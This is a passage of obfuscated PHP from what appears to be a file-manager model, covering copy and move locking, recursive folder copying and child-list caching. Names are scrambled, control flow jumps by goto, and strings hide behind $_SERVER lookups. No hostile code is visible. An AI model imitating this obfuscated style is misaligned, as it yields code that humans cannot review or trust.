…Ö[528]), $eº†Æš—è); $this->_lockEvent($CŠÂàÑ›÷¯, array($eã·„ …Ö[533], $eã·„ …Ö[529], $eã·„ …Ö[530]), $eº†Æš—è); $this->_lockCheckEnd($eã·„ …Ö[528], $CŠÂàÑ›÷¯); goto Ağ•ß¸öÏá; dí•ŠµØ¥ï: $eã·„ …Ö =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $this->_lockCheck($eã·„ …Ö[528], $CŠÂàÑ›÷¯); goto a•ª ÇÃØÓ; Ağ•ß¸öÏá: } public function lockMoveEnd($F§î°ÑÁĞ) { goto F§ß²›ˆ•; DÊ“ÓÍŞæ: $this->_lockKey($C–ø¤Å–ğÈ[532] . $F§î°ÑÁĞ, $fäõøœ÷»…); $this->_lockEvent($F§î°ÑÁĞ, array($C–ø¤Å–ğÈ[526], $C–ø¤Å–ğÈ[527]), $fäõøœ÷»…); $this->_lockParent($F§î°ÑÁĞ, array($C–ø¤Å–ğÈ[526], $C–ø¤Å–ğÈ[528]), $fäõøœ÷»…); goto DğêÁ†ã–; DğêÁ†ã–: $this->_lockEvent($F§î°ÑÁĞ, array($C–ø¤Å–ğÈ[533], $C–ø¤Å–ğÈ[529], $C–ø¤Å–ğÈ[530]), $fäõøœ÷»…); goto Eê™¸…¿Ã¾; F§ß²›ˆ•: $C–ø¤Å–ğÈ =& $_SERVER[Šº]; if (!$this->allowLock()) { return; } $fäõøœ÷»… = 0; goto DÊ“ÓÍŞæ; Eê™¸…¿Ã¾: } private function _lockCheck($e’Š°˜ÈŒ, $Eæˆ“æĞ‚Ş) { goto DŠÅ¦ì¡‰Î; d¼§òµ„ÈÔ: $dˆÉÒù²İ÷ = array_reverse($this->parentLevelArray($FëÈŠöĞè‰[$A½ö†œ¾âÉ[494]])); foreach ($dˆÉÒù²İ÷ as $eãºÃÖÔŠÏ) { $bö²ˆ…£íê = $e’Š°˜ÈŒ . $A½ö†œ¾âÉ[535] . $eãºÃÖÔŠÏ; if (CacheLock::lockGet($A½ö†œ¾âÉ[536] . $bö²ˆ…£íê)) { $FëÈŠöĞè‰ = $this->sourceInfo($eãºÃÖÔŠÏ); CacheLock::setErrorMsg($A½ö†œ¾âÉ[160] . htmlspecialchars($FëÈŠöĞè‰[$A½ö†œ¾âÉ[28]]) . $A½ö†œ¾âÉ[512] . $E’±óŸãß†); $this->_lockKey($bö²ˆ…£íê, 1); $this->_lockKey($bö²ˆ…£íê, 0); } } goto aÖê÷Œç; aìë°Œùğ¶: $this->_lockTimeStart[$bö²ˆ…£íê] = timeFloat(); if (!is_array($FëÈŠöĞè‰)) { return; } $E’±óŸãß† = LNG($A½ö†œ¾âÉ[534]); goto B·«Â×ÒÆÚ; B·«Â×ÒÆÚ: CacheLock::setErrorMsg($A½ö†œ¾âÉ[160] . htmlspecialchars($FëÈŠöĞè‰[$A½ö†œ¾âÉ[28]]) . $A½ö†œ¾âÉ[512] . $E’±óŸãß†); $this->_lockKey($bö²ˆ…£íê, 1); $this->_lockKey($bö²ˆ…£íê, 0); goto d¼§òµ„ÈÔ; DŠÅ¦ì¡‰Î: $A½ö†œ¾âÉ =& $_SERVER[Šº]; $FëÈŠöĞè‰ = $this->sourceInfo($Eæˆ“æĞ‚Ş); $bö²ˆ…£íê = $e’Š°˜ÈŒ . $A½ö†œ¾âÉ[95] . $Eæˆ“æĞ‚Ş; goto aìë°Œùğ¶; aÖê÷Œç: } private function _lockCheckEnd($FÒñ·„ÍÇë, $AÇ¹ğŞèÒ¾) { goto F¶¤‹‚¬àá; CÜÕÈù‰‚Ã: if (!isset($this->_lockTimeStart[$dŠ½™ê˜¤])) { return; } $d‹èŒ¦Âê× = timeFloat() - $this->_lockTimeStart[$dŠ½™ê˜¤]; unset($this->_lockTimeStart[$dŠ½™ê˜¤]); goto FÑªµáÁè–; FÑªµáÁè–: if ($d‹èŒ¦Âê× > 0.5) { unset(self::$cacheSourceInfo[$D”ƒñ»—‹œ[445] . $AÇ¹ğŞèÒ¾]); } $d¡¹¤²—‰Í = $this->sourceInfo($AÇ¹ğŞèÒ¾); if (!$d¡¹¤²—‰Í) { show_json(LNG($D”ƒñ»—‹œ[105]), !1); } goto fš‹ŞêÕ»; F¶¤‹‚¬àá: $D”ƒñ»—‹œ =& $_SERVER[Šº]; $dŠ½™ê˜¤ = $FÒñ·„ÍÇë . $D”ƒñ»—‹œ[95] . $AÇ¹ğŞèÒ¾; CacheLock::setErrorMsg($D”ƒñ»—‹œ[374]); goto CÜÕÈù‰‚Ã; fš‹ŞêÕ»: } private function _lockParent($AçáŒÊ…ª, $aŠïÃ¨êá, $DÈ¢‚Õµ“) { if (!$this->autoLockSet) { return; } $Fø‚˜„ Ú = $this->sourceInfo($AçáŒÊ…ª); if (!is_array($Fø‚˜„ Ú)) { return; } $b³ÒÖë“Ù° = array_reverse($this->parentLevelArray($Fø‚˜„ Ú[$_SERVER[Šº][494]])); foreach ($b³ÒÖë“Ù° as $d”ÕÔÕ£è) { $this->_lockEvent($d”ÕÔÕ£è, $aŠïÃ¨êá, $DÈ¢‚Õµ“); } } private function _lockEvent($Dğğ¬…è¼ä, $Eò¹‚Ê©‹Ü, $fİ–ø‹©ã‰) { $aÏÒ–µî¹ =& $_SERVER[Šº]; if (!$this->autoLockSet) { return; } foreach ($Eò¹‚Ê©‹Ü as $E‡–¢ŠÇŠš) { $aÌÍàœ¹®” = $E‡–¢ŠÇŠš . $aÏÒ–µî¹[95] . $Dğğ¬…è¼ä; if ($fİ–ø‹©ã‰ && CacheLock::lockGet($aÏÒ–µî¹[536] . $aÌÍàœ¹®”)) { continue; } $this->_lockKey($aÌÍàœ¹®”, $fİ–ø‹©ã‰); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($CãºöîØğ, $B²ï¯Œ×¦Ü = 1) { $cÇõùÀÕ—Ê = $_SERVER[Šº][536] . md5($CãºöîØğ); if ($B²ï¯Œ×¦Ü) { if (isset(self::$_lockItemArr[$cÇõùÀÕ—Ê])) { return; } self::$_lockItemArr[$cÇõùÀÕ—Ê] = 1; CacheLock::lock($cÇõùÀÕ—Ê, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$cÇõùÀÕ—Ê])) { return; } unset(self::$_lockItemArr[$cÇõùÀÕ—Ê]); CacheLock::unlock($cÇõùÀÕ—Ê); } } public function isParentOf($DãëŒÉß›š, $EÈ©¾éª®ó) { goto C³»µ®ìÑ¤; B¤ñ¥¿‹í: return $CÂ¸Şò—ª—; goto e£ùñ†Ñ¨; A£Ğ‚ÜÅË…: $F¯à’„³›¾ = $a£®”ÉÀ´Î[$cêæáøÊ¤È[494]] . $a£®”ÉÀ´Î[$cêæáøÊ¤È[403]] . $cêæáøÊ¤È[47]; $a‰°°è¶¤Ï = $dÓÑáÎĞ[$cêæáøÊ¤È[494]] . $dÓÑáÎĞ[$cêæáøÊ¤È[403]] . $cêæáøÊ¤È[47]; $CÂ¸Şò—ª— = strpos($a‰°°è¶¤Ï, $F¯à’„³›¾) === 0; goto B¤ñ¥¿‹í; C³»µ®ìÑ¤: $cêæáøÊ¤È =& $_SERVER[Šº]; $a£®”ÉÀ´Î = $this->sourceInfo($DãëŒÉß›š); $dÓÑáÎĞ = $this->sourceInfo($EÈ©¾éª®ó); goto A£Ğ‚ÜÅË…; e£ùñ†Ñ¨: } private $targetIsDelete = 0; public function copy($c‘¿É×¹±, $Aâ‹ÁÉßã©, $c»‘Èç¸š = REPEAT_REPLACE, $FÅŞŞ¥È = '') { goto c§ñ™‹ÀˆÓ; B±ÜÃÉ‚¶ã: $this->updateModifyTime($Aâ‹ÁÉßã©); return $d¹Ô šÙÁ; goto Eê¾ĞÛ‹‹Ö; DÚ¥‹ËÍÓœ: if (!$FçØÎ·°´Ä || !$c¬‹‰’˜Å || $c¬‹‰’˜Å[$CÎÑ…‰Ÿ­ç[410]] != $CÎÑ…‰Ÿ­ç[87]) { return !1; } if ($this->isParentOf($c‘¿É×¹±, $Aâ‹ÁÉßã©)) { return !1; } $BĞšÂõîÍå = $FÅŞŞ¥È ? $FÅŞŞ¥È : $FçØÎ·°´Ä[$CÎÑ…‰Ÿ­ç[28]]; goto A™ëªÈ¨; AŒ˜ä‚ÆÔ: $this->_childrenListClear(); $this->lockCopyEnd($c‘¿É×¹±); $this->lockWriteEnd($Aâ‹ÁÉßã©, $BĞšÂõîÍå); goto f÷¢âä¼ÛÙ; F‘ÒÌ„ã‚Ç: $this->saveAll($A‡ƒ—…²Óˆ[$CÎÑ…‰Ÿ­ç[539]]); Model($CÎÑ…‰Ÿ­ç[192])->linkAdd($A‡ƒ—…²Óˆ[$CÎÑ…‰Ÿ­ç[537]]); $this->folderSizeReset($Aâ‹ÁÉßã©); goto B±ÜÃÉ‚¶ã; f÷¢âä¼ÛÙ: if ($FçØÎ·°´Ä[$CÎÑ…‰Ÿ­ç[410]] == $CÎÑ…‰Ÿ­ç[87] && $CŒìóËˆ÷‡ == $d¹Ô šÙÁ) { $this->folderSizeResetChildren($CŒìóËˆ÷‡); } Model($CÎÑ…‰Ÿ­ç[540])->addAll($A‡ƒ—…²Óˆ[$CÎÑ…‰Ÿ­ç[538]], array(), !0); if ($CŒìóËˆ÷‡ != $d¹Ô šÙÁ || $FçØÎ·°´Ä[$CÎÑ…‰Ÿ­ç[410]] == $CÎÑ…‰Ÿ­ç[87]) { Model($CÎÑ…‰Ÿ­ç[541])->eventCopy($d¹Ô šÙÁ); } goto F‘ÒÌ„ã‚Ç; A™ëªÈ¨: $this->lockCopyStart($c‘¿É×¹±); $this->lockWriteStart($Aâ‹ÁÉßã©, $BĞšÂõîÍå); $A‡ƒ—…²Óˆ = array($CÎÑ…‰Ÿ­ç[537] => array(), $CÎÑ…‰Ÿ­ç[538] => array(), $CÎÑ…‰Ÿ­ç[539] => array()); goto b’Æ‹ÑÇÇ; b’Æ‹ÑÇÇ: $this->targetIsDelete = intval($FçØÎ·°´Ä[$CÎÑ…‰Ÿ­ç[430]]); $CŒìóËˆ÷‡ = $this->fileNameExistCache($Aâ‹ÁÉßã©, $FçØÎ·°´Ä[$CÎÑ…‰Ÿ­ç[28]]); $d¹Ô šÙÁ = $this->_copy($c‘¿É×¹±, $Aâ‹ÁÉßã©, $c»‘Èç¸š, $A‡ƒ—…²Óˆ, !0, $FÅŞŞ¥È); goto AŒ˜ä‚ÆÔ; c§ñ™‹ÀˆÓ: $CÎÑ…‰Ÿ­ç =& $_SERVER[Šº]; $FçØÎ·°´Ä = $this->sourceInfo($c‘¿É×¹±); $c¬‹‰’˜Å = $this->sourceInfo($Aâ‹ÁÉßã©); goto DÚ¥‹ËÍÓœ; Eê¾ĞÛ‹‹Ö: } private function _copy($EÕïª©ö, $fèÎİÓè±˜, $EÜ¡½ğ©¨„, &$fÀ¢¼Î˜ÎĞ, $aæ¼÷è¶, $aºœñåäÀà = '') { goto d¨ºßã¾˜å; D«§ò×ë“ç: $cŞÏ´ºÜÛô = $aºœñåäÀà ? $aºœñåäÀà : $dµİ¼ÀãÆˆ[$E‚ù¸ğÛìÂ[28]]; $EÓŠÍ½£¬Æ = $this->fileNameExistCache($fèÎİÓè±˜, $cŞÏ´ºÜÛô); if ($aæ¼÷è¶) { $this->_childrenAllMake($EÕïª©ö); if ($C¤¦š™í—ƒ && $EÓŠÍ½£¬Æ) { $this->_childrenAllMake($EÓŠÍ½£¬Æ); } } goto aÊË¢•“; aÊË¢•“: if (!$EÓŠÍ½£¬Æ) { return $this->_copyCreate($EÕïª©ö, $fèÎİÓè±˜, $cŞÏ´ºÜÛô, $fÀ¢¼Î˜ÎĞ); } $F×òÙøÕ• = $EÓŠÍ½£¬Æ; if ($C¤¦š™í—ƒ) { if ($EÜ¡½ğ©¨„ == REPEAT_RENAME_FOLDER) { $cŞÏ´ºÜÛô = $this->fileNameAutoCache($fèÎİÓè±˜, $cŞÏ´ºÜÛô, $EÜ¡½ğ©¨„, $C¤¦š™í—ƒ); $F×òÙøÕ• = $this->_copyCreate($EÕïª©ö, $fèÎİÓè±˜, $cŞÏ´ºÜÛô, $fÀ¢¼Î˜ÎĞ); } else { $D…¼åĞİçÀ = $this->_childrenList($EÕïª©ö); foreach ($D…¼åĞİçÀ as $AÃá›ˆÎÙ¿) { $this->_copy($AÃá›ˆÎÙ¿[$E‚ù¸ğÛìÂ[403]], $EÓŠÍ½£¬Æ, $EÜ¡½ğ©¨„, $fÀ¢¼Î˜ÎĞ, !1); } } } else { if ($EÜ¡½ğ©¨„ == REPEAT_RENAME || $EÜ¡½ğ©¨„ == REPEAT_RENAME_FOLDER) { $cŞÏ´ºÜÛô = $this->fileNameAutoCache($fèÎİÓè±˜, $cŞÏ´ºÜÛô, $EÜ¡½ğ©¨„, $C¤¦š™í—ƒ); $F×òÙøÕ• = $this->_copyCreate($EÕïª©ö, $fèÎİÓè±˜, $cŞÏ´ºÜÛô, $fÀ¢¼Î˜ÎĞ); } else { if ($EÜ¡½ğ©¨„ == REPEAT_REPLACE) { $e˜Ê‡Óë¬ = $this->sourceInfoCache($EÓŠÍ½£¬Æ); $fë²êË·Ã = $this->fileHistory($e˜Ê‡Óë¬, $dµİ¼ÀãÆˆ[$E‚ù¸ğÛìÂ[454]], $dµİ¼ÀãÆˆ[$E‚ù¸ğÛìÂ[78]]); if ($fë²êË·Ã) { $fÀ¢¼Î˜ÎĞ[$E‚ù¸ğÛìÂ[537]][] = $dµİ¼ÀãÆˆ[$E‚ù¸ğÛìÂ[454]]; } } else { if ($EÜ¡½ğ©¨„ == REPEAT_SKIP) { } } } Hook::trigger($E‚ù¸ğÛìÂ[542], array($E‚ù¸ğÛìÂ[543], $dµİ¼ÀãÆˆ, 0)); } goto FÉœ¥èÔéä; FÉœ¥èÔéä: return $F×òÙøÕ•; goto EãŠ™Æóµ; d¨ºßã¾˜å: $E‚ù¸ğÛìÂ =& $_SERVER[Šº]; $dµİ¼ÀãÆˆ = $this->sourceInfoCache($EÕïª©ö); $C¤¦š™í—ƒ = $dµİ¼ÀãÆˆ[$E‚ù¸ğÛìÂ[410]] == $E‚ù¸ğÛìÂ[87]; goto D«§ò×ë“ç; EãŠ™Æóµ: } private function _copyCreate($EŞï®‹¥Á‘, $c‡Ïæ²åö», $C»Õ¾¦, &$a¯èãœ«) { goto aÉÅËğ–í; d‹À©Åµ§˜: $Aç”ÃÔ°àÏ[$EŞï®‹¥Á‘] = $Bä ±Ê©‚; $c¬À£¥âäï = array(); $fÕÌ­»‚ïö = array(); goto F«”“øòŒ›; d»–ª¾¦Ü: $this->_childrenListAll($EŞï®‹¥Á‘, $EÍù…Å); $f…®…·¶Æ = count($EÍù…Å); if ($f…®…·¶Æ == 0) { return $Bä ±Ê©‚; } goto Bâ‚éáËä˜; aÉÅËğ–í: $AßÍÛõ¥ =& $_SERVER[Šº]; $CçîŸ³ÎÚæ = $this->sourceInfoCache($EŞï®‹¥Á‘); $Dòâ·çÖÚ = $this->sourceInfoCache($c‡Ïæ²åö»); goto EŞ†ÈšóÁ¥; eøöÅøÂ˜Ë: $this->addAll($d¾ãœ©©†š, array(), !1); $e—ÙŞä›‡ = $this->where(array($AßÍÛõ¥[485] => $Bä ±Ê©‚))->select(); $Aç”ÃÔ°àÏ = $this->_childrenMakeRelation($EÍù…Å, $e—ÙŞä›‡); goto d‹À©Åµ§˜; f Úéª°À£: if ($CçîŸ³ÎÚæ[$AßÍÛõ¥[410]] != $AßÍÛõ¥[87]) { $a¯èãœ«[$AßÍÛõ¥[537]][] = $CçîŸ³ÎÚæ[$AßÍÛõ¥[454]]; return $Bä ±Ê©‚; } $EÍù…Å = array(); $d¾ãœ©©†š = array(); goto d»–ª¾¦Ü; f¸¼¿‘³³Î: $this->chunkEventSet($AßÍÛõ¥[551], array($AßÍÛõ¥[552], $ağô™ìó¡¿, $f…®…·¶Æ)); $this->saveAll($fÕÌ­»‚ïö); return $Bä ±Ê©‚; goto D­ß’Ä¯«‘; Báºô‰ë‹Ğ: $Bä ±Ê©‚ = $this->add($ağô™ìó¡¿); $b¦Íƒ’æø = array($AßÍÛõ¥[403] => $Bä ±Ê©‚, $AßÍÛõ¥[28] => $C»Õ¾¦); $this->_copyApplyMeta($b¦Íƒ’æø, $a¯èãœ«); goto f Úéª°À£; F«”“øòŒ›: foreach ($e—ÙŞä›‡ as $A¯Ùß²Éš”) { $A»à¹ÈÀ = $A¯Ùß²Éš”[$AßÍÛõ¥[403]]; $F¹ìë°Ã¿Œ = $this->_childrenMatch($Aç”ÃÔ°àÏ, $A¯Ùß²Éš”, $AÂØç£Äì·); $c¬À£¥âäï[] = array($AßÍÛõ¥[403], $A»à¹ÈÀ, $AßÍÛõ¥[485], $F¹ìë°Ã¿Œ[$AßÍÛõ¥[485]]); $fÕÌ­»‚ïö[] = array($AßÍÛõ¥[403], $A»à¹ÈÀ, $AßÍÛõ¥[494], $F¹ìë°Ã¿Œ[$AßÍÛõ¥[494]]); $this->_copyApplyMeta($A¯Ùß²Éš”, $a¯èãœ«); if ($A¯Ùß²Éš”[$AßÍÛõ¥[410]] != $AßÍÛõ¥[87]) { $a¯èãœ«[$AßÍÛõ¥[537]][] = $A¯Ùß²Éš”[$AßÍÛõ¥[454]]; } } $this->chunkEventSet($AßÍÛõ¥[549], array($AßÍÛõ¥[550], $ağô™ìó¡¿, $f…®…·¶Æ)); $this->saveAll($c¬À£¥âäï); goto f¸¼¿‘³³Î; EŞ†ÈšóÁ¥: $ağô™ìó¡¿ = $this->_makeItemData($CçîŸ³ÎÚæ, $Dòâ·çÖÚ, $C»Õ¾¦); Hook::trigger($AßÍÛõ¥[544], $ağô™ìó¡¿); Hook::trigger($AßÍÛõ¥[545], array($AßÍÛõ¥[546], $ağô™ìó¡¿, 0)); goto Báºô‰ë‹Ğ; Bâ‚éáËä˜: $AÂØç£Äì· = $this->sourceInfo($Bä ±Ê©‚); foreach ($EÍù…Å as $A¯Ùß²Éš”) { $EÂ¾³Ï£‡ = $this->_makeItemData($A¯Ùß²Éš”, $AÂØç£Äì·, $A¯Ùß²Éš”[$AßÍÛõ¥[28]]); $EÂ¾³Ï£‡[$AßÍÛõ¥[494]] = $A¯Ùß²Éš”[$AßÍÛõ¥[494]]; $d¾ãœ©©†š[] = $EÂ¾³Ï£‡; } $this->chunkEventSet($AßÍÛõ¥[547], array($AßÍÛõ¥[548], $ağô™ìó¡¿, $f…®…·¶Æ)); goto eøöÅøÂ˜Ë; D­ß’Ä¯«‘: } private function _childrenMakeRelation($càí½õŒ¶, $E²‘ùÁİÙ±) { $b³äá›èŠ =& $_SERVER[Šº]; $c‘ÎÍÛƒŠ = array(); $dš†ÑíÒéê = array(); foreach ($càí½õŒ¶ as $A“ï…ßÒÇÊ) { $Aš‚´¦µéµ = $A“ï…ßÒÇÊ[$b³äá›èŠ[28]] . $b³äá›èŠ[8] . $A“ï…ßÒÇÊ[$b³äá›èŠ[494]]; $c‘ÎÍÛƒŠ[$Aš‚´¦µéµ] = $A“ï…ßÒÇÊ[$b³äá›èŠ[403]]; } foreach ($E²‘ùÁİÙ± as $A“ï…ßÒÇÊ) { $Aš‚´¦µéµ = $A“ï…ßÒÇÊ[$b³äá›èŠ[28]] . $b³äá›èŠ[8] . $A“ï…ßÒÇÊ[$b³äá›èŠ[494]]; $e…Ğ³©ÕÕõ = $c‘ÎÍÛƒŠ[$Aš‚´¦µéµ]; $dš†ÑíÒéê[$e…Ğ³©ÕÕõ] = $A“ï…ßÒÇÊ[$b³äá›èŠ[403]]; } return $dš†ÑíÒéê; } private function _childrenMatch($Cóƒ‘¯Ãé, $BçÚ¡×ƒİ, $E¥Ö¬æë ) { goto EÖßÙ¨Œ; EÖßÙ¨Œ: $E–¥„®ˆÈ‰ =& $_SERVER[Šº]; $A²‚èò­˜ø = $E¥Ö¬æë [$E–¥„®ˆÈ‰[494]]; $FÆĞä‘ÀÁ¶ = $this->parentLevelArray($BçÚ¡×ƒİ[$E–¥„®ˆÈ‰[494]]); goto E‰¼Šî¯²´; A–î‰ˆ’®†: $fùìöøí¬À = $EŒ‡Ÿ¤òßµ[count($EŒ‡Ÿ¤òßµ) - 1]; return array($E–¥„®ˆÈ‰[485] => $fùìöøí¬À, $E–¥„®ˆÈ‰[494] => $A²‚èò­˜ø); goto d·°Ü¯•êÜ; E‰¼Šî¯²´: foreach ($FÆĞä‘ÀÁ¶ as $Aˆ‘¢î»÷—) { if (isset($Cóƒ‘¯Ãé[$Aˆ‘¢î»÷—])) { $A²‚èò­˜ø .= $Cóƒ‘¯Ãé[$Aˆ‘¢î»÷—] . $E–¥„®ˆÈ‰[553]; } } $A²‚èò­˜ø = rtrim($A²‚èò­˜ø, $E–¥„®ˆÈ‰[47]) . $E–¥„®ˆÈ‰[47]; $EŒ‡Ÿ¤òßµ = $this->parentLevelArray($A²‚èò­˜ø); goto A–î‰ˆ’®†; d·°Ü¯•êÜ: } private function _makeItemData($C´¤Ú†ƒàõ, $E‘¿ÓêÇ‡Ò, $f†¿ö ëêâ) { $c«·Ÿ‹ì¶È =& $_SERVER[Šº]; $f¬ó²öŸ¡í = array($c«·Ÿ‹ì¶È[554] => $C´¤Ú†ƒàõ[$c«·Ÿ‹ì¶È[410]], $c«·Ÿ‹ì¶È[420] => $f†¿ö ëêâ, $c«·Ÿ‹ì¶È[555] => $C´¤Ú†ƒàõ[$c«·Ÿ‹ì¶È[412]], $c«·Ÿ‹ì¶È[455] => $C´¤Ú†ƒàõ[$c«·Ÿ‹ì¶È[454]], $c«·Ÿ‹ì¶È[556] => $C´¤Ú†ƒàõ[$c«·Ÿ‹ì¶È[78]], $c«·Ÿ‹ì¶È[557] => $E‘¿ÓêÇ‡Ò[$c«·Ÿ‹ì¶È[411]], $c«·Ÿ‹ì¶È[558] => $E‘¿ÓêÇ‡Ò[$c«·Ÿ‹ì¶È[491]], $c«·Ÿ‹ì¶È[559] => USER_ID, $c«·Ÿ‹ì¶È[560] => USER_ID, $c«·Ÿ‹ì¶È[402] => $E‘¿ÓêÇ‡Ò[$c«·Ÿ‹ì¶È[403]], $c«·Ÿ‹ì¶È[561] => $E‘¿ÓêÇ‡Ò[$c«·Ÿ‹ì¶È[494]] . $E‘¿ÓêÇ‡Ò[$c«·Ÿ‹ì¶È[403]] . $c«·Ÿ‹ì¶È[47], $c«·Ÿ‹ì¶È[424] => $C´¤Ú†ƒàõ[$c«·Ÿ‹ì¶È[84]], $c«·Ÿ‹ì¶È[429] => 0, $c«·Ÿ‹ì¶È[562] => $c«·Ÿ‹ì¶È[33]); return $f¬ó²öŸ¡í; } private function _copyApplyMeta($bö´ŒÍ‡¨, &$dîÁÎœÇÄó) { $fƒçó¢öˆã =& $_SERVER[Šº]; $B·©å×Ò¸ = $bö´ŒÍ‡¨[$fƒçó¢öˆã[403]]; $a£Ô–·ò¼ = $bö´ŒÍ‡¨[$fƒçó¢öˆã[28]]; if (!isset($bö´ŒÍ‡¨[$fƒçó¢öˆã[563]]) || !$bö´ŒÍ‡¨[$fƒçó¢öˆã[563]] || $bö´ŒÍ‡¨[$fƒçó¢öˆã[563]] == $fƒçó¢öˆã[504]) { $dîÁÎœÇÄó[$fƒçó¢öˆã[539]][] = array($fƒçó¢öˆã[403], $B·©å×Ò¸, $fƒçó¢öˆã[563], short_id($B·©å×Ò¸)); } if (Input::check($a£Ô–·ò¼, $fƒçó¢öˆã[564])) { $dîÁÎœÇÄó[$fƒçó¢öˆã[538]][] = array($fƒçó¢öˆã[403] => $B·©å×Ò¸, $fƒçó¢öˆã[93] => $fƒçó¢öˆã[451], $fƒçó¢öˆã[371] => str_replace($fƒçó¢öˆã[50], $fƒçó¢öˆã[33], Pinyin::encode($a£Ô–·ò¼))); $dîÁÎœÇÄó[$fƒçó¢öˆã[538]][] = array($fƒçó¢öˆã[403] => $B·©å×Ò¸, $fƒçó¢öˆã[93] => $fƒçó¢öˆã[450], $fƒçó¢öˆã[371] => Pinyin::encode($a£Ô–·ò¼, $fƒçó¢öˆã[565])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A»šÄ¯éíò) { goto eÇ›ˆë¾¯ò; DĞø»‰•Şñ: $CÒŠœÛôã = array($c°¤¸Æ¾´š[494] => array($c°¤¸Æ¾´š[520], $Eª”§ç¹¨Ë[$c°¤¸Æ¾´š[494]] . $A»šÄ¯éíò . $c°¤¸Æ¾´š[521]), $c°¤¸Æ¾´š[430] => $this->targetIsDelete); $DÍ÷÷Œƒ½ = $this->field($f­ä‡µË‚Š)->where($CÒŠœÛôã)->select(); if (!$DÍ÷÷Œƒ½) { return; } goto aÀòßàáÌè; aÀòßàáÌè: $DÍ÷÷Œƒ½ = array_to_keyvalue($DÍ÷÷Œƒ½, $c°¤¸Æ¾´š[403]); foreach ($DÍ÷÷Œƒ½ as $D…¶ÉùÅ³‡) { $EÀŒÃâŸÆŒ = $D…¶ÉùÅ³‡[$c°¤¸Æ¾´š[485]]; $A»šÄ¯éíò = $D…¶ÉùÅ³‡[$c°¤¸Æ¾´š[403]]; if (!isset($this->_childrenListCache[$A»šÄ¯éíò]) && $D…¶ÉùÅ³‡[$c°¤¸Æ¾´š[410]] == $c°¤¸Æ¾´š[87]) { $this->_childrenListCache[$A»šÄ¯éíò] = array(); } if (!isset($this->_childrenListCache[$EÀŒÃâŸÆŒ])) { $this->_childrenListCache[$EÀŒÃâŸÆŒ] = array(); } $this->_childrenListCache[$EÀŒÃâŸÆŒ][$A»šÄ¯éíò] = $D…¶ÉùÅ³‡; $this->_childrenItemCache[$A»šÄ¯éíò] = $D…¶ÉùÅ³‡; } goto Bª»ŠÙÚ¼©; eÇ›ˆë¾¯ò: $c°¤¸Æ¾´š =& $_SERVER[Šº]; $Eª”§ç¹¨Ë = $this->sourceInfo($A»šÄ¯éíò); $f­ä‡µË‚Š = $c°¤¸Æ¾´š[431]; goto DĞø»‰•Şñ; Bª»ŠÙÚ¼©: } private function _childrenListAll($fì‡•—­¶, &$Eˆ½ƒê„šÔ) { $DÁà¡©ÄËÕ =& $_SERVER[Šº]; if (!isset($this->_childrenListCache[$fì‡•—­¶])) { return; } $fÂ¥‹¼ßòè = $this->_childrenListCache[$fì‡•—­¶]; foreach ($fÂ¥‹¼ßòè as $EéİšœŠ => $bç°öó†‡) { $Eˆ½ƒê„šÔ[$EéİšœŠ] = $bç°öó†‡; if ($bç°öó†‡[$DÁà¡©ÄËÕ[410]] == $DÁà¡©ÄËÕ[87]) { $this->_childrenListAll($EéİšœŠ, $Eˆ½ƒê„šÔ); } } } private function sourceInfoCache($b–Â÷„ã–) { if (isset($this->_childrenItemCache[$b–Â÷„ã–])) { return $this->_childrenItemCache[$b–Â÷„ã–]; } return $this->sourceInfo($b–Â÷„ã–); } private function _childrenList($D¸î§ôĞÑÖ) { if (isset($this->_childrenListCache[$D¸î§ôĞÑÖ])) { return $this->_childrenListCache[$D¸î§ôĞÑÖ]; } return $this->_childrenListSelect($D¸î§ôĞÑÖ); } private function _childrenListSelect($a÷Ô¦Òƒ‹) { goto F×Éïùºá; DœŞàğÖ»: foreach ($B™µ¿Ìâ–Ã as $a÷Ô¦Òƒ‹ => $bÆ ”¸Ø«Ÿ) { $this->_childrenItemCache[$a÷Ô¦Òƒ‹] = $bÆ ”¸Ø«Ÿ; } return $B™µ¿Ìâ–Ã; goto fà¶ÓÌõéÑ; F‚ğˆ¥¯ÍË: $E™ƒ¥ È›È = $E™ƒ¥ È›È ? $E™ƒ¥ È›È : array(); $B™µ¿Ìâ–Ã = array_to_keyvalue($E™ƒ¥ È›È, $E¨…Ì¼Ø’–[403]); $this->_childrenListCache[$a÷Ô¦Òƒ‹] = $B™µ¿Ìâ–Ã; goto DœŞàğÖ»; F×Éïùºá: $E¨…Ì¼Ø’– =& $_SERVER[Šº]; $a™¬˜ğÑˆ = array($E¨…Ì¼Ø’–[485] => $a÷Ô¦Òƒ‹, $E¨…Ì¼Ø’–[430] => $this->targetIsDelete); $E™ƒ¥ È›È = $this->where($a™¬˜ğÑˆ)->select(); goto F‚ğˆ¥¯ÍË; fà¶ÓÌõéÑ: } private function fileNameExistCache($c°Ã¦˜á×÷, $E¡ïñöÕÛ) { $Cçá×½ƒŸØ =& $_SERVER[Šº]; $E¡ïñöÕÛ = strtolower($E¡ïñöÕÛ); $e‡ÌÓÛÖ‰À = $this->_childrenList($c°Ã¦˜á×÷); foreach ($e‡ÌÓÛÖ‰À as $f¹¢«Ô“ ö) { if ($E¡ïñöÕÛ == strtolower($f¹¢«Ô“ ö[$Cçá×½ƒŸØ[28]])) { return $f¹¢«Ô“ ö[$Cçá×½ƒŸØ[403]]; } } return !1; } private function fileNameAutoCache($b‹‘Š’›¼, $fÈ»›ÂÁùº, $Bá¡ÆŞ¢Ê, $aèğ–ƒÆ£) { $a´Èë»—‰­ =& $_SERVER[Šº]; $c‚îè÷¾£ = $this->_childrenList($b‹‘Š’›¼); $cŞá´¤é£ = array_to_keyvalue($c‚îè÷¾£, $a´Èë»—‰­[33], $a´Èë»—‰­[28]); return $this->fileNameAutoGet($cŞá´¤é£, $fÈ»›ÂÁùº, $Bá¡ÆŞ¢Ê, $aèğ–ƒÆ£); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($d¤ÜŒæ¨Á, $cÁ«²ˆ´¼õ, $Fƒœ¼¥“®š = REPEAT_REPLACE, $dÆ›ø„´Ü = '') { goto eÑì¥‹®Ş¸; DéÍæÏ«ï´: if ($cŠõÁôŠªñ[$c‰Ó¶àà‘[410]] == $c‰Ó¶àà‘[87] && $CÅï¶»ğ´) { $this->folderSizeResetChildren($eÃ…ÒÏ¦í·); } 